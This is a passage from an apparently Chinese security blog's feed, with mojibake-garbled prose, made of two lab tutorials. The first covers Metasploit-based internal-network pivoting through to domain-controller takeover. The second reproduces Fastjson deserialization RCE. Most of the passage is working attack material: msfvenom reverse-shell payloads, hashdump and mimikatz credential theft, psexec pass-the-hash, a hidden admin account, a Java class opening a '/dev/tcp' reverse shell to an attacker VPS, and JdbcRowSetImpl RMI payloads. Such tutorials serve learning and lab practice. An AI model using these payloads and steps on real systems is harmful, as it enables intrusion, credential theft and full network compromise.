src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318220150442.png" alt="image-20220318220150442"></p><p>â€‹    ä¸‹è½½åœ°å€:</p><pre><code>http://sourceforge.net/project/ssocks/</code></pre><p>è§£å‹ç¼–è¯‘:</p><pre><code>tar zxvf ssocks-0.0.14.tar.gzcd ssocks-0.0.14./configure &amp;&amp; make #ç¼–è¯‘åä¼šåˆ›å»ºä¸€ä¸ªsrcæ–‡ä»¶å¤¹cd src</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318221138321.png" alt="image-20220318221138321"></p><p>kaliæœºä½¿ç”¨ï¼š</p><pre><code>./rcsocks -l 1088 -p 1080 -vv</code></pre><p>ç­‰å¾…è¿œç¨‹socks5æœåŠ¡å™¨è®¿é—®æœ¬åœ°1080ç«¯å£ï¼Œåˆ›å»ºç«¯å£1080ä¸æœ¬åœ°ç«¯å£1088çš„è¿æ¥é€šé“</p><p>webæœåŠ¡å™¨:</p><pre><code>/rssocks -vv -s 192.168.10.115:1080</code></pre><p>åˆ©ç”¨proxychainsè¿›è¡ŒSocks5ä»£ç†</p><p> ç¼–è¾‘proxychainså·¥å…·</p><pre><code>vim /etc/proxychains.conf</code></pre><p>æ³¨é‡Šæ‰socks4ï¼ŒåŠ ä¸Šsocks5</p><pre><code>#socks4 127.0.0.1 9050socks5 127.0.0.1 1088</code></pre><p>kailæœºä½¿ç”¨ä»£ç†è®¿é—®ï¼š</p><pre><code>proxychains firefox http://10.10.10.128</code></pre><p>å°±ä¼šæˆåŠŸè®¿é—®</p><p>ä½¿ç”¨nmapæ‰«æ</p><pre><code>proxychains nmap -Pn -sT 10.10.10.128</code></pre><h1 id="è·¨è·¯ç”±æ‰«æ"><a href="#è·¨è·¯ç”±æ‰«æ" class="headerlink" title="è·¨è·¯ç”±æ‰«æ"></a>è·¨è·¯ç”±æ‰«æ</h1><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318224021872.png" alt="image-20220318224021872"></p><p>ç”Ÿæˆmetaploitåé—¨ï¼Œå¹¶ç›‘å¬</p><pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.115 lport=12345 -f exe &gt;/var/www/html/sakura.exeuse exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 192.168.0.115set lport 12345exploit</code></pre><p>è¿è¡Œåé—¨ï¼Œå¾—åˆ°åå¼¹shell</p><pre><code>getuid  æŸ¥çœ‹å½“å‰ç”¨æˆ·ifconfig  è·å–ç½‘å¡ä¿¡æ¯run get_local_subnets è·å–è·¯ç”±ä¿¡æ¯run autoroute -p æŸ¥çœ‹å½“å‰è·¯ç”±run autoroute -s 10.10.10.0/24 å¢åŠ è·¯ç”± </code></pre><p>ä½¿ç”¨socks4aæ¨¡å—</p><pre><code>use auxiliary/server/socks4a</code></pre><p>ã€€SRVHOSTï¼šç›‘å¬çš„ipåœ°å€ï¼Œé»˜è®¤ä¸º0.0.0.0ï¼Œä¸€èˆ¬ä¸éœ€è¦æ›´æ”¹ã€‚<br>   SRVPORTï¼šç›‘å¬çš„ç«¯å£ï¼Œé»˜è®¤ä¸º1080ã€‚</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318225453685.png" alt="image-20220318225453685"></p><p>è®¾ç½®ç«¯å£</p><pre><code>set SRVPORT 1044exploit</code></pre><p>ç„¶åé…ç½®proxychains</p><pre><code>vim /etc/proxychains.conf</code></pre><p>proxychains.conf </p><pre><code>socks4 192.168.0.115 1044</code></pre><p>ä½¿ç”¨nmapæ‰«æ</p><pre><code>proxychains nmap -sT Pn 10.10.10.128</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318230018344.png" alt="image-20220318230018344"></p><p>ä¹Ÿå¯ä»¥ç”¨æµè§ˆå™¨è®¿é—®</p><pre><code>proxychains firefox http://10.10.10.128</code></pre><p>ç¼ºç‚¹:</p><p>æ— æ³•è¿›è¡Œçˆ†ç ´(å¦‚hydra)ç­‰ä¸€äº›æ“ä½œ</p><h1 id="MSF-å¸¸è§çš„å†…ç½‘æµ‹è¯•æ¸—é€"><a href="#MSF-å¸¸è§çš„å†…ç½‘æµ‹è¯•æ¸—é€" class="headerlink" title="MSF-å¸¸è§çš„å†…ç½‘æµ‹è¯•æ¸—é€"></a>MSF-å¸¸è§çš„å†…ç½‘æµ‹è¯•æ¸—é€</h1><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318231904664.png" alt="image-20220318231904664"></p><p>ç”Ÿæˆmetaploitåé—¨ï¼Œå¹¶ç›‘å¬</p><pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.115 lport=12345 -f exe &gt;/var/www/html/sakura.exeuse exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 192.168.0.115set lport 12345exploit</code></pre><p>è¿è¡Œåé—¨ï¼Œå¾—åˆ°2003æœåŠ¡å™¨åå¼¹shell</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318234051072.png" alt="image-20220318234051072"></p><p>æŸ¥çœ‹è·¯ç”±è¡¨</p><pre><code>route</code></pre><p> <img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318234749786.png" alt="image-20220318234749786"></p><p>å¢åŠ è·¯ç”±</p><pre><code>run autoroute -s 10.10.10.0/24</code></pre><p>æŸ¥çœ‹è·¯ç”±åˆ—è¡¨</p><pre><code>run autoroute -p</code></pre><p>æ¸…ç©ºè·¯ç”±</p><pre><code>run autoroute -d</code></pre><p>ææƒå‘½ä»¤:</p><pre><code>sysinfo æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯</code></pre><pre><code>ps æŸ¥çœ‹è¿›ç¨‹</code></pre><p> <img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318235448756.png" alt="image-20220318235448756"></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318235621609.png" alt="image-20220318235621609"></p><pre><code>getuid å½“å‰ç”¨æˆ·getprivs å°½å¯èƒ½æå‡æƒé™getsystem é€šè¿‡å„ç§æ”»å‡»å‘é‡æ¥æå‡ç³»ç»Ÿç”¨æˆ·æƒé™</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318235905714.png" alt="image-20220318235905714"></p><p>å¢åŠ ç®¡ç†å‘˜</p><pre><code>net user sakura$ 123456 /add &amp; net localground administrators sakura$ /add</code></pre><p>æ£€æµ‹å­˜æ´»ip</p><pre><code>run post/multi/gather/ping_sweep rhosts=10.10.10.0/24run post/windows/gather/arp_scanner rhosts=10.10.10.0/24</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319000735682.png" alt="image-20220319000735682"></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319000816930.png" alt="image-20220319000816930"></p><p> å¢åŠ è·¯ç”±è¡¨</p><pre><code>run autoroute -s 10.10.10.0/24backgrounduse auxiliary/server/socks4aset SRVHOST 192.168.0.115 #ç«¯å£é»˜è®¤æ˜¯1080exploitvim /etc/proxychains.conf</code></pre><pre><code>socks4 192.168.0.115 1080</code></pre><pre><code>proxychains nmap -sT -Pn -P 445,22,80,3306 10.10.10.130-135 --open -oN 10.10.10.0.txt</code></pre><p>445å¼€æ”¾ï¼Œå°è¯•hashæ”»å‡»</p><p>hashè·å–</p><pre><code>meterpreter &gt; hashdump</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319014555755.png" alt="image-20220319014555755"></p><pre><code>ues exploit/windows/smb/psexecset payload windows/meterpreter/bind_tcpset rhost 10.10.10.131set SMBUser Administratorset SMBPass 44efcexxxxxxxxxxxxxxxxxxxxxxxxexploit</code></pre><p>ä½¿ç”¨mimikatzæ¥è·å–æ›´å¤šå¯†ç </p><pre><code>meterpreter &gt; load mimikatzmeterpreter &gt; msv  #è·å–hashå¯†ç meterpreter &gt; run getgui -e #å¼€å¯3389ç«¯å£meterpreter &gt; run getgui -u sakura -p 123456 #å¢åŠ ç”¨æˆ·</code></pre><pre><code>root@kali:~# proxychains rdesktop -u Administrator -p 123456 10.10.10.131 #ç™»å½•3389ç«¯å£</code></pre><h1 id="MSFè¿›è¡Œä¸€æ¬¡å®Œæ•´çš„åŸŸæ¸—é€æµç¨‹"><a href="#MSFè¿›è¡Œä¸€æ¬¡å®Œæ•´çš„åŸŸæ¸—é€æµç¨‹" class="headerlink" title="MSFè¿›è¡Œä¸€æ¬¡å®Œæ•´çš„åŸŸæ¸—é€æµç¨‹"></a>MSFè¿›è¡Œä¸€æ¬¡å®Œæ•´çš„åŸŸæ¸—é€æµç¨‹</h1><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319122142921.png" alt="image-20220319122142921"></p><p>æ¸—é€å‰æ:æ‹¿åˆ°äº†åŸŸå®¢æˆ·æœº2008çš„shell</p><p>ç”Ÿæˆmetaploitåé—¨ï¼Œå¹¶ç›‘å¬</p><pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.115 lport=12345 -f exe &gt;/var/www/html/sakura.exeuse exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 192.168.0.115set lport 12345exploit</code></pre><p>è¿è¡Œåé—¨ï¼Œå¾—åˆ°2008æœåŠ¡å™¨åå¼¹shell</p><p>æ‰«æå†…ç½‘çš„æœºå™¨</p><pre><code>run post/windows/gather/qrp_scanner rhosts=10.10.1.0/24</code></pre><p>åŠ å…¥è·¯ç”±</p><pre><code>backgroundroute add 10.10.1.3 255.255.255.0 1</code></pre><p>ä½¿ç”¨æ‰«æå™¨</p><pre><code>use scanner/portscan/tcp  #é»˜è®¤æ‰«æ1-10000ç«¯å£set rhost 10.10.1.3exploit</code></pre><p>é€šè¿‡æ‰«æå‘ç° 10.10.1.3 çš„3306ç«¯å£å­˜åœ¨mysqlæœåŠ¡</p><p>è¿›è¡Œå¼±å£ä»¤æ”»å‡»</p><pre><code>use auxiliary/scanner/mysql/mysql_loginset rhost 10.10.1.3set username rootset pass_file /root/password.txtexploit</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319124232296.png" alt="image-20220319124232296"></p><p>æˆåŠŸçˆ†ç ´å‡ºå¼±å£ä»¤</p><p>å°è¯•ä½¿ç”¨mysql_mofææƒ,å¾—åˆ°åŸŸå®¢æˆ·æœº2003çš„session</p><pre><code>use exploit/windows/mysql/mysql_mofset password 123456set rhost 10.10.1.3set username rootset payload windows/metepreter/bind_tcpexploit</code></pre><p>ç°åœ¨æ‹¿åˆ°äº†2003çš„ç³»ç»Ÿæƒé™ï¼Œå°±å¯ä»¥ä½¿ç”¨ä¸€äº›å‘½ä»¤è¿›è¡Œä¿¡æ¯æœé›†</p><pre><code>new view /domain:moonsec #æŸ¥çœ‹å½“å‰åŸŸç”¨æˆ·</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319125543944.png" alt="image-20220319125543944"></p><p>å¾—åˆ°ç›®æ ‡æœºip</p><pre><code>ping SERVERS2003</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319125634094.png" alt="image-20220319125634094"></p><pre><code>net user /domain  #è·å–æ‰€æœ‰åŸŸçš„ç”¨æˆ·åˆ—è¡¨net group /domain #è·å–åŸŸç”¨æˆ·ç»„ä¿¡æ¯net group &quot;domain admins&quot; /domain #è·å–å½“å‰åŸŸç®¡ç†å‘˜ä¿¡æ¯net time /domain #æŸ¥çœ‹åŸŸå®é™…åŠåŸŸæœåŠ¡å™¨åå­—</code></pre><p>å¯ä»¥å¾—åˆ°åŸŸæ§ä¿¡æ¯</p><pre><code>WIN-7230786H6KU.moonsec.com 10.10.1.2 #è¿™ä¸ªå°±æ˜¯åŸŸæ§</code></pre><p>å› ä¸ºæ™®é€šåŸŸç”¨æˆ· éœ€è¦æ›´æ”¹ç³»ç»Ÿä¿¡æ¯ éƒ½éœ€è¦é€šè¿‡åŸŸç®¡ç†å‘˜çš„æ“ä½œ è¦è¾“å…¥è´¦å·å¯†ç </p><p>æŠ“æ˜æ–‡ mimikatz</p><pre><code>meterpreter &gt; load mimikatzmeterpreter &gt; msv  #è·å–hashå¯†ç </code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319130901701.png" alt="image-20220319130901701"></p><p>å°è¯•èƒ½å¦æŠ“æ˜æ–‡</p><pre><code>meterpreter &gt; kerberos #è·å–æ˜æ–‡å¯†ç </code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319132330184.png" alt="image-20220319132330184"></p><p>ç°åœ¨æƒ³è¦è·å–session</p><pre><code>use exploit/windows/smb/psexecset rhost 10.10.1.2set SMBDomain moonsecset SMBUser administratorset SMBPass xxx123456..set payload windows/meterpreter/bind_tcpexploit</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319133243629.png" alt="image-20220319133243629"></p><p>å¾—åˆ°åŸŸæ§shellï¼Œä½†æ˜¯æƒé™ä¸å¤Ÿ</p><pre><code>get privsgetsystem</code></pre><p>ä½¿ç”¨uacææƒ</p><pre><code>use exploit/windows/local/askset sessions 3exploit</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319133844674.png" alt="image-20220319133844674"></p><p>ææƒæˆåŠŸ</p><p>è·å–hashå¯†ç </p><pre><code>meterpreter &gt; hashdump#æˆ–è€…meterpreter &gt;  run post/windows/gather/hashdump</code></pre><p>mimikatzæŠ“æ˜æ–‡å¯†ç </p><pre><code>meterpreter &gt; load mimikatzmeterpreter &gt; msv  #è·å–hashå¯†ç meterpreter &gt; kerberos #è·å–æ˜æ–‡å¯†ç meterpreter &gt; mimikatz_command -f samd::hashes #å¦ä¸€ç§æ–¹å¼è·å–hashå€¼</code></pre><p>æƒé™ç»´æŒï¼šè¿›ç¨‹æ³¨å…¥</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319133930152.png" alt="image-20220319133930152"></p><pre><code>meterpreter &gt; migrate 2804</code></pre><p>å¼€å¯åŸŸæ§è¿œç¨‹è¿æ¥</p><pre><code>meterpreter &gt; run getgui -e</code></pre><p>ä½¿ç”¨socks4aè¿æ¥3389</p><pre><code>run autoroute -s 10.10.1.0/24 255.255.255.0use auxiliary/server/socks4aset srvhost 10.10.1.2</code></pre><p>é…ç½®pxoxychains.conf</p><pre><code>vim /etc/proxychains.conf</code></pre><pre><code>....socks4 192.168.0.115 1080</code></pre><p>ç™»å½•3389</p><pre><code>root@kali:~ proxychains rdesktop 10.10.1.2 #ç™»å½•3389ç«¯å£</code></pre><p>å¢åŠ è´¦å·</p><pre><code>meterpreter &gt; run getgui -u moonsec -p moonsec</code></pre>]]></content>
      
      
      <categories>
          
          <category> ç½‘ç»œå®‰å…¨ </category>
          
          <category> å†…ç½‘ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å†…ç½‘ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fastjsonæ¼æ´å¤ç°</title>
      <link href="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><p><a href="https://so.csdn.net/so/search?q=Fastjson&spm=1001.2101.3001.7020">Fastjson</a>æ˜¯é˜¿é‡Œå·´å·´çš„å¼€æºJSONè§£æåº“ï¼Œå®ƒå¯ä»¥è§£æJSONæ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œæ”¯æŒå°†Java Beanåºåˆ—åŒ–ä¸ºJSONå­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥ä»JSONå­—ç¬¦ä¸²ååºåˆ—åŒ–åˆ°JavaBeanã€‚å…·æœ‰æ‰§è¡Œæ•ˆç‡é«˜çš„ç‰¹ç‚¹ï¼Œåº”ç”¨èŒƒå›´å¹¿æ³›ã€‚</p><h1 id="fastjsonæŒ‡çº¹è¯†åˆ«"><a href="#fastjsonæŒ‡çº¹è¯†åˆ«" class="headerlink" title="fastjsonæŒ‡çº¹è¯†åˆ«"></a>fastjsonæŒ‡çº¹è¯†åˆ«</h1><p>å½“æˆ‘ä»¬åœ¨æ¸—é€æµ‹è¯•ä¸­ï¼ŒæŠ“åŒ…çš„æ—¶å€™å‘ç°è¿”å›çš„æµé‡å†…å®¹å­˜åœ¨jsonæ ¼å¼æ—¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥æƒ³å®ƒæ˜¯ä¸æ˜¯ä½¿ç”¨äº†fastjsonåº“</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70.png" alt="img"></p><p>æ¥ç€æˆ‘ä»¬å¯ä»¥è¿›ä¸€æ­¥è¿›è¡Œåˆ¤æ–­</p><ol><li>æ ¹æ®æŠ¥é”™ä¿¡æ¯åˆ¤æ–­</li></ol><p>å‘é€ä¸€ä¸ªpostè¯·æ±‚ã€‚å‘é€çš„æ•°æ®ä¸ºæ²¡é—­åˆçš„èŠ±æ‹¬å·ï¼Œå¦‚æœæœåŠ¡å™¨æ²¡æœ‰å±è”½é”™è¯¯ä¿¡æ¯åˆ™ä¼šæŠ¥å‡ºfastjsonçš„ä¿¡æ¯ã€‚å¦‚æœå±è”½äº†æŠ¥é”™ä¿¡æ¯è¯·çœ‹ç¬¬äºŒæ¡</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70.png" alt="img"></p><ol start="2"><li>åˆ©ç”¨dnslogç›²æ‰“</li></ol><p>å¯¹ç›®æ ‡å‘é€ä¸€ä¸ªPOSTè¯·æ±‚ï¼Œè¯·æ±‚ä½“å†…å®¹å¦‚ä¸‹ã€‚è¯·æ±‚å¤´æ·»åŠ Content-Type: application/json</p><pre><code>&#123;&quot;zeo&quot;:&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125; </code></pre><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70.png" alt="img"></p><p>DNSlogåˆ·æ–°æˆåŠŸ</p><h1 id="Fastjson-lt-1-2-24è¿œç¨‹ä»£ç æ‰§è¡Œ-CVE-2017-18349"><a href="#Fastjson-lt-1-2-24è¿œç¨‹ä»£ç æ‰§è¡Œ-CVE-2017-18349" class="headerlink" title="Fastjson&lt;1.2.24è¿œç¨‹ä»£ç æ‰§è¡Œ(CVE-2017-18349)"></a>Fastjson&lt;1.2.24è¿œç¨‹ä»£ç æ‰§è¡Œ(CVE-2017-18349)</h1><p><strong>æ¼æ´è¯¦æƒ…</strong></p><p>fastjsonåœ¨è§£æjsonçš„è¿‡ç¨‹ä¸­ï¼Œæ”¯æŒä½¿ç”¨autoTypeæ¥å®ä¾‹åŒ–æŸä¸€ä¸ªå…·ä½“çš„ç±»ï¼Œå¹¶è°ƒç”¨è¯¥ç±»çš„set/getæ–¹æ³•æ¥è®¿é—®å±æ€§ã€‚é€šè¿‡æŸ¥æ‰¾ä»£ç ä¸­ç›¸å…³çš„æ–¹æ³•ï¼Œå³å¯æ„é€ å‡ºä¸€äº›æ¶æ„åˆ©ç”¨é“¾ã€‚</p><p><strong>æ¼æ´ç‰ˆæœ¬</strong></p><p>fastjson &lt;=1.2.24</p><p><strong>æ¼æ´åˆ†æ</strong></p><p><a href="http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/">http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/</a></p><p><strong>éœ€è¦ç¯å¢ƒ</strong></p><p>åœ¨æœ¬æœºæå‰å®‰è£…å¥½mavenå’Œjdk</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220316235940219.png" alt="image-20220316235940219"></p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317000000186.png" alt="image-20220317000000186"></p><p><strong>æ¼æ´å¤ç°</strong></p><p>ä½¿ç”¨vulhubæ­å»ºæ¼æ´ç¯å¢ƒ</p><pre><code class="text">docker-compose up d</code></pre><p>è®¿é—®xxx:8090</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220316235812389.png" alt="image-20220316235812389"></p><p>ä¿å­˜ä»¥ä¸‹ä»£ç </p><p>dnslog.java</p><pre><code class="java">import java.io.BufferedReader;import java.io.InputStream;import java.io.InputStreamReader; public class Exploit&#123;    public Exploit() throws Exception &#123;        Process p = Runtime.getRuntime().exec(new String[]&#123;&quot;bash&quot;, &quot;-c&quot;, &quot;bash -i &gt;&amp; /dev/tcp/VPSçš„IP/6666 0&gt;&amp;1&quot;&#125;);        InputStream is = p.getInputStream();        BufferedReader reader = new BufferedReader(new InputStreamReader(is));         String line;        while((line = reader.readLine()) != null) &#123;            System.out.println(line);        &#125;         p.waitFor();        is.close();        reader.close();        p.destroy();    &#125;     public static void main(String[] args) throws Exception &#123;    &#125;&#125;</code></pre><p>ç¼–è¯‘ä¸ºExploit.class</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317010125235.png" alt="image-20220317010125235"></p><p>ä½¿ç”¨pythonåœ¨å½“å‰ç›®å½•ä¸‹èµ·ä¸€ä¸ªhttpæœåŠ¡ï¼Œå¦‚æœç«¯å£å ç”¨æ¢å…¶ä»–çš„</p><pre><code class="text">python -m SimpleHTTPServer 4567</code></pre><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317000648363.png" alt="image-20220317000648363"></p><p>ä½¿ç”¨marshalsecé¡¹ç›®ï¼Œå¯åŠ¨RMIæœåŠ¡ï¼Œç›‘å¬9999ç«¯å£å¹¶åŠ è½½è¿œç¨‹ç±»Exploit.class</p><pre><code class="text">git clone https://github.com/mbechler/marshalsec.gitcd marshalsec/ç¼–è¯‘é¡¹ç›®mvn clean package -DskipTests</code></pre><p>ä»¥æˆ‘æ­å»ºExploit.classç±»httpæœåŠ¡çš„æœåŠ¡å™¨IPä¸º2.2.2.2ç«¯å£ä¸º4567</p><pre><code class="text">cd target/java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://xxx:4567/#Exploit&quot; 9999</code></pre><p>RMIæœåŠ¡å¯ä»¥æ­å»ºåœ¨ä¸Exploit.classç±»çš„httpæœåŠ¡åŒä¸€å°æœåŠ¡å™¨ï¼Œä¹Ÿå¯ä»¥æ­å»ºåœ¨å…¶å®ƒæœåŠ¡å™¨ä¸Šã€‚æˆ‘ä»¬æ¼”ç¤ºè¿˜æ˜¯åœ¨åŒä¸€å°ã€‚</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317001425835.png" alt="image-20220317001425835"></p><p>ç¯å¢ƒå·²ç»æ­å»ºå¥½ï¼Œæ¥ä¸‹æ¥ä½¿ç”¨burpå¼€å§‹</p><pre><code class="text">POST / HTTP/1.1Accept: */*Accept-Language: zh-CNUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; NMTE)Host: ç›®æ ‡ip:8090Connection: closeContent-Length: 162Content-Type: application/jsonAccept-Encoding: gzip, deflate&#123;    &quot;b&quot;:&#123;        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,        &quot;dataSourceName&quot;:&quot;rmi://vpsçš„ip:9999/Exploit&quot;,        &quot;autoCommit&quot;:true    &#125;&#125;</code></pre><p>å¦‚å›¾å³ä»£è¡¨æ”»å‡»æˆåŠŸ</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317012518646.png" alt="image-20220317012518646"></p><p>RMIæœåŠ¡å“åº”</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317013058412.png" alt="image-20220317013058412"></p><p>pythonæ­å»ºçš„httpæœåŠ¡å“åº”</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317013143699.png" alt="image-20220317013143699"></p><p>nc</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317013212099.png" alt="image-20220317013212099"></p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317013225316.png" alt="image-20220317013225316"></p><h1 id="Fastjson-1-2-47-è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´"><a href="#Fastjson-1-2-47-è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´" class="headerlink" title="Fastjson 1.2.47 è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´"></a>Fastjson 1.2.47 è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´</h1><p>å’Œfastjson1.2.24å·®ä¸å¤šï¼Œå°±æ˜¯pocä¸ä¸€æ ·è€Œå·²</p><p><strong>å½±å“ç‰ˆæœ¬</strong></p><ul><li>fastjson&lt;=1.2.47</li></ul><p><strong>æ¼æ´æ£€æµ‹</strong></p><p>æ£€æµ‹æ–¹å¼å’Œ1.2.24ä¸€æ ·</p><p>æ¼æ´åˆ©ç”¨</p><p>åˆ›å»ºæ¶æ„ç±»ï¼Œpythonæ­å»ºæœåŠ¡</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317010125235.png" alt="image-20220317010125235"></p><p>æ­å»ºRMIæœåŠ¡</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317001425835.png" alt="image-20220317001425835"></p><p>å‘é€çš„æ•°æ®åŒ…æ”¹ä¸ºå³å¯</p><pre><code class="text">POST / HTTP/1.1Host: 192.168.140.158:8090   #é¶æœºåœ°å€Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/jsonContent-Length: 263 &#123;    &quot;a&quot;:&#123;        &quot;@type&quot;:&quot;java.lang.Class&quot;,        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;    &#125;,    &quot;b&quot;:&#123;        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,        &quot;dataSourceName&quot;:&quot;rmi://VPSåœ°å€:ç«¯å£/Exploit&quot;,  #è¿™é‡Œçš„Exploitä¸èƒ½å˜        &quot;autoCommit&quot;:true    &#125;&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> ç½‘ç»œå®‰å…¨ </category>
          
          <category> æ¼æ´å¤ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fastjson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shiroæ¼æ´å¤ç°</title>
